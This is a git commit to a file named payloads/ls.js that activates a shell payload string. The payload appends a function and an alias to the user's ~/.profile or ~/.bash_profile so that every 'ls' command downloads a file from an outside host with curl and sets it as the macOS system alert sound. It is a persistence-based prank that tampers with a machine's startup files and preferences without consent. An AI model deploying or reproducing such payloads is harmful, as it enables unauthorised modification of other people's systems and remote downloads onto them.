b286e96799d065c3ddd038600e0a71f140f4c126
Joel Wasserman <joel.wasserman8@gmail.com>
2018-05-02 10:48:29 -0400

    adding to .profile if it exists isntead of bash_profile

--- payloads/ls.js
+++ payloads/ls.js
@@ -1,15 +1,12 @@
-// module.exports = `
-// if [ -f ~/.profile ] ;
-// then
-//   echo "function eles() { if [ ! -e /tmp/x.out ]; then curl -sL hoku.me/assets/airhorn > /tmp/x.out; fi; defaults write .GlobalPreferences com.apple.sound.beep.sound /tmp/x.out; }" >> ~/.profile
-//   echo "alias ls='eles && ls'" >> ~/.profile
-//   source ~/.profile
-// else 
-//   echo "function eles() { if [ ! -e /tmp/x.out ]; then curl -sL hoku.me/assets/airhorn > /tmp/x.out; fi; defaults write .GlobalPreferences com.apple.sound.beep.sound /tmp/x.out; }" >> ~/.bash_profile
-//   echo "alias ls='eles && ls'" >> ~/.bash_profile
-//   source ~/.bash_profile
-// fi
-// `
 module.exports = `
-echo hello
+if [ -f ~/.profile ] 
+then
+  echo "function eles() { if [ ! -e /tmp/x.out ]; then curl -sL hoku.me/assets/airhorn > /tmp/x.out; fi; defaults write .GlobalPreferences com.apple.sound.beep.sound /tmp/x.out; }" >> ~/.profile
+  echo "alias ls='eles && ls'" >> ~/.profile
+  source ~/.profile
+else 
+  echo "function eles() { if [ ! -e /tmp/x.out ]; then curl -sL hoku.me/assets/airhorn > /tmp/x.out; fi; defaults write .GlobalPreferences com.apple.sound.beep.sound /tmp/x.out; }" >> ~/.bash_profile
+  echo "alias ls='eles && ls'" >> ~/.bash_profile
+  source ~/.bash_profile
+fi
 `
